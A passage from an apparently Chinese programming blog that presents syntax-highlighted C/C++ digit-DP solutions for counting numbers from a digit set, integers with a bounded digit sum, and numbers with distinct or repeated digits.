class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">// offset是辅助变量，完全由len决定，只是为了方便提取num中某一位数字，不是关键变量</span><br><span class="hljs-comment">// 还剩下len位没有决定</span><br><span class="hljs-comment">// 如果之前的位已经确定比num小，那么free == 1，表示接下的数字可以自由选择</span><br><span class="hljs-comment">// 如果之前的位和num一样，那么free == 0，表示接下的数字不能大于num当前位的数字</span><br><span class="hljs-comment">// 如果之前的位没有使用过数字，fix == 0</span><br><span class="hljs-comment">// 如果之前的位已经使用过数字，fix == 1</span><br><span class="hljs-comment">// 返回最终&lt;=num的可能性有多少种</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; digits, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> <span class="hljs-built_in">free</span>, <span class="hljs-type">int</span> fix)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> fix == <span class="hljs-number">1</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// num在当前位的数字</span><br>    <span class="hljs-type">int</span> cur = (num / offset) % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> (fix == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 之前从来没有选择过数字</span><br>        <span class="hljs-comment">// 当前依然可以不要任何数字，累加后续的可能性</span><br>        ans += f1(digits, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">free</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 不能自由选择的情况</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : digits) &#123;<br>            <span class="hljs-keyword">if</span> (i &lt; cur) &#123;<br>                ans += f1(digits, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == cur) &#123;<br>                ans += f1(digits, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// i &gt; cur</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 可以自由选择的情况</span><br>        ans += digits.size() * f1(digits, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">atMostNGivenDigitSet1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; strs, <span class="hljs-type">int</span> num)</span> &#123;<br>    <span class="hljs-type">int</span> tmp = num / <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        tmp /= <span class="hljs-number">10</span>;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> m = strs.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">digits</span><span class="hljs-params">(m)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        digits[i] = stoi(strs[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> f1(digits, num, offset, len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">f2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; digits, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; cnt, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// num自己</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">// cur是num当前位的数字</span><br>    <span class="hljs-type">int</span> cur = (num / offset) % <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : digits) &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; cur) &#123;<br>            ans += cnt[len - <span class="hljs-number">1</span>];<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == cur) &#123;<br>            ans += f2(digits, cnt, num, offset / <span class="hljs-number">10</span>, len - <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">atMostNGivenDigitSet2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; strs, <span class="hljs-type">int</span> num)</span> &#123;<br>    <span class="hljs-type">int</span> m = strs.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">digits</span><span class="hljs-params">(m)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        digits[i] = stoi(strs[i]);<br>    &#125;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> tmp = num / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        tmp /= <span class="hljs-number">10</span>;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-comment">// cnt[i] : 已知前缀比num小，剩下i位没有确定，请问前缀确定的情况下，一共有多少种数字排列</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(len)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = m, k = <span class="hljs-number">1</span>; k &lt; len; k++, i *= m) &#123;<br>        cnt[k] = i;<br>        ans += i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans + f2(digits, cnt, num, offset, len);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt; strs = &#123;<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>&#125;;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result from atMostNGivenDigitSet1: &quot;</span> &lt;&lt; atMostNGivenDigitSet1(strs, num) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result from atMostNGivenDigitSet2: &quot;</span> &lt;&lt; atMostNGivenDigitSet2(strs, num) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="统计整数数目"><a href="#统计整数数目" class="headerlink" title="统计整数数目"></a>统计整数数目</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 统计整数数目</span><br><span class="hljs-comment">// 给你两个数字字符串 num1 和 num2 ，以及两个整数max_sum和min_sum</span><br><span class="hljs-comment">// 如果一个整数 x 满足以下条件，我们称它是一个好整数</span><br><span class="hljs-comment">// num1 &lt;= x &lt;= num2</span><br><span class="hljs-comment">// min_sum &lt;= digit_sum(x) &lt;= max_sum</span><br><span class="hljs-comment">// 请你返回好整数的数目</span><br><span class="hljs-comment">// 答案可能很大，答案对 1000000007 取模</span><br><span class="hljs-comment">// 注意，digit_sum(x)表示x各位数字之和</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1000000007</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">23</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXM = <span class="hljs-number">401</span>;<br><br><span class="hljs-type">int</span> dp[MAXN][MAXM][<span class="hljs-number">2</span>];<br><br><span class="hljs-type">char</span> num[MAXN];<br><span class="hljs-type">int</span> min_sum, max_sum, len;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= max_sum; j++) &#123;<br>            dp[i][j][<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>            dp[i][j][<span class="hljs-number">1</span>] = <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 注意：</span><br><span class="hljs-comment">// 数字，char[] num</span><br><span class="hljs-comment">// 数字长度，int len</span><br><span class="hljs-comment">// 累加和最小要求，int min</span><br><span class="hljs-comment">// 累加和最大要求，int max</span><br><span class="hljs-comment">// 这四个变量都是全局静态变量，所以不用带参数，直接访问即可</span><br><span class="hljs-comment">// 递归含义：</span><br><span class="hljs-comment">// 从num的高位出发，当前来到i位上</span><br><span class="hljs-comment">// 之前决定的数字累加和是sum</span><br><span class="hljs-comment">// 之前的决定已经比num小，后续可以自由选择数字，那么free == 1</span><br><span class="hljs-comment">// 之前的决定和num一样，后续不可以自由选择数字，那么free == 0</span><br><span class="hljs-comment">// 返回有多少种可能性</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> sum, <span class="hljs-type">int</span> <span class="hljs-built_in">free</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (sum &gt; max_sum) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (sum + (len - i) * <span class="hljs-number">9</span> &lt; min_sum) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (i == len) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (dp[i][sum][<span class="hljs-built_in">free</span>] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[i][sum][<span class="hljs-built_in">free</span>];<br>    &#125;<br><br>    <span class="hljs-type">int</span> cur = num[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">free</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 还不能自由选择</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> pick = <span class="hljs-number">0</span>; pick &lt; cur; pick++) &#123;<br>            ans = (ans + f(i + <span class="hljs-number">1</span>, sum + pick, <span class="hljs-number">1</span>)) % MOD;<br>        &#125;<br>        ans = (ans + f(i + <span class="hljs-number">1</span>, sum + cur, <span class="hljs-number">0</span>)) % MOD;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 可以自由选择</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> pick = <span class="hljs-number">0</span>; pick &lt;= <span class="hljs-number">9</span>; pick++) &#123;<br>            ans = (ans + f(i + <span class="hljs-number">1</span>, sum + pick, <span class="hljs-number">1</span>)) % MOD;<br>        &#125;<br>    &#125;<br>    dp[i][sum][<span class="hljs-built_in">free</span>] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">check</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        sum += num[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum &gt;= min_sum &amp;&amp; sum &lt;= max_sum;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">count</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; num1, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; num2, <span class="hljs-type">int</span> min_sum, <span class="hljs-type">int</span> max_sum)</span> &#123;<br>    ::min_sum = min_sum;<br>    ::max_sum = max_sum;<br>    <span class="hljs-built_in">strcpy</span>(num, num2.c_str());<br>    len = num2.length();<br>    build();<br>    <span class="hljs-type">int</span> ans = f(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-built_in">strcpy</span>(num, num1.c_str());<br>    len = num1.length();<br>    build();<br>    ans = (ans - f(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + MOD) % MOD;<br>    <br>    <span class="hljs-keyword">if</span> (check()) &#123;<br>        ans = (ans + <span class="hljs-number">1</span>) % MOD;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> num1 = <span class="hljs-string">&quot;100&quot;</span>;<br>    <span class="hljs-built_in">string</span> num2 = <span class="hljs-string">&quot;500&quot;</span>;<br>    <span class="hljs-type">int</span> min_sum = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> max_sum = <span class="hljs-number">20</span>;<br>    <br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result: &quot;</span> &lt;&lt; count(num1, num2, min_sum, max_sum) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="完全没有重复的数字个数"><a href="#完全没有重复的数字个数" class="headerlink" title="完全没有重复的数字个数"></a>完全没有重复的数字个数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1000000007</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">countSpecialNumbers</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> tmp = n / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>        tmp /= <span class="hljs-number">10</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// cnt[i] :</span><br>    <span class="hljs-comment">// 一共长度为len，还剩i位没有确定，确定的前缀为len-i位，且确定的前缀不为空</span><br>    <span class="hljs-comment">// 0~9一共10个数字，没有选择的数字剩下10-(len-i)个</span><br>    <span class="hljs-comment">// 那么在后续的i位上，有多少种排列</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(len)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, k = <span class="hljs-number">10</span> - len + <span class="hljs-number">1</span>; i &lt; len; i++, k++) &#123;<br>        cnt[i] = cnt[i - <span class="hljs-number">1</span>] * k;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (len &gt;= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-comment">// 如果n的位数是len位，先计算位数少于len的数中，每一位都互不相同的正整数个数，并累加</span><br>        <span class="hljs-comment">// 所有1位数中，每一位都互不相同的正整数个数 = 9</span><br>        <span class="hljs-comment">// 所有2位数中，每一位都互不相同的正整数个数 = 9 * 9</span><br>        <span class="hljs-comment">// 所有3位数中，每一位都互不相同的正整数个数 = 9 * 9 * 8</span><br>        <span class="hljs-comment">// 所有4位数中，每一位都互不相同的正整数个数 = 9 * 9 * 8 * 7</span><br>        <span class="hljs-comment">// ...比len少的位数都累加...</span><br>        ans = <span class="hljs-number">9</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>, a = <span class="hljs-number">9</span>, b = <span class="hljs-number">9</span>; i &lt; len; i++, b--) &#123;<br>            a *= b;<br>            ans += a;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果n的位数是len位，已经计算了位数少于len个的情况</span><br>    <span class="hljs-comment">// 下面计算一定有len位的数字中，&lt;=n且每一位都互不相同的正整数个数</span><br>    <span class="hljs-type">int</span> first = n / offset;<br>    <span class="hljs-comment">// 小于num最高位数字的情况</span><br>    ans += (first - <span class="hljs-number">1</span>) * cnt[len - <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// 后续累加上，等于num最高位数字的情况</span><br>    ans += f(cnt, n, len - <span class="hljs-number">1</span>, offset / <span class="hljs-number">10</span>, <span class="hljs-number">1</span> &lt;&lt; first);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">// 之前已经确定了和num一样的前缀，且确定的部分一定不为空</span><br><span class="hljs-comment">// 还有len位没有确定</span><br><span class="hljs-comment">// 哪些数字已经选了，哪些数字没有选，用status表示</span><br><span class="hljs-comment">// 返回&lt;=num且每一位数字都不一样的正整数有多少个</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; cnt, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> status)</span> &#123;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// num自己</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// first是num当前位的数字</span><br>    <span class="hljs-type">int</span> first = (num / offset) % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>; cur &lt; first; cur++) &#123;<br>        <span class="hljs-keyword">if</span> ((status &amp; (<span class="hljs-number">1</span> &lt;&lt; cur)) == <span class="hljs-number">0</span>) &#123;<br>            ans += cnt[len - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((status &amp; (<span class="hljs-number">1</span> &lt;&lt; first)) == <span class="hljs-number">0</span>) &#123;<br>        ans += f(cnt, num, len - <span class="hljs-number">1</span>, offset / <span class="hljs-number">10</span>, status | (<span class="hljs-number">1</span> &lt;&lt; first));<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result: &quot;</span> &lt;&lt; countSpecialNumbers(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="至少有1位重复的数字个数"><a href="#至少有1位重复的数字个数" class="headerlink" title="至少有1位重复的数字个数"></a>至少有1位重复的数字个数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 至少有1位重复的数字个数</span><br><span class="hljs-comment">// 给定正整数n，返回在[1, n]范围内至少有1位重复数字的正整数个数</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">countSpecialNumbers</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> offset = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> tmp = n / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span> (tmp &gt; <span class="hljs-number">0</span>) &#123;<br>        len++;<br>        offset *= <span class="hljs-number">10</span>;<br>        tmp /= 